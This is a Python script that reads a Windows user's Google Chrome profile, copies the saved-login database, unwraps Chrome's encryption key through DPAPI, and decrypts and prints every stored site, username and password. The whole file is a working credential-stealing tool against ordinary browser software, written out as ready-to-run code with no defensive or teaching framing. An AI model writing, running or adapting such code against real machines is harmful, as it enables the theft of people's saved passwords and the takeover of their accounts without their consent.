import base64
import shutil
import sqlite3
from Crypto.Cipher import AES
import json
import win32crypt
import sys
#Chrome username & password file path
keyFile = f"C:\\Users\\{sys.argv[1]}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
chrome_path_login_db = f"C:\\Users\\{sys.argv[1]}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
shutil.copy2(chrome_path_login_db, "Loginvault.db")
#Connect to sqlite database
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
#Select statement to retrieve info
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( keyFile, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        #Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

secretKey = get_secret_key()

for index,login in enumerate(cursor.fetchall()):
    url = login[0]
    username = login[1]
    ciphertext= login[2]
    if (url):
        print("Url: ",url)
    if (username):
        print("Username: ",username)
    # Step 1: Extracting initilisation vector from ciphertext
    initialisation_vector = ciphertext[3:15]
    # Step 2: Extracting encrypted password from ciphertext
    encrypted_password = ciphertext[15:-16]
    # Step 3:Build the AES algorithm to decrypt the password
    cipher = AES.new(secretKey, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password)
    decrypted_pass = decrypted_pass.decode()
    # Step 4: Decrypted Password
    if (decrypted_pass):
        print(f"password: {decrypted_pass}")
    if(url or username or decrypted_pass):
        print("-----------------------")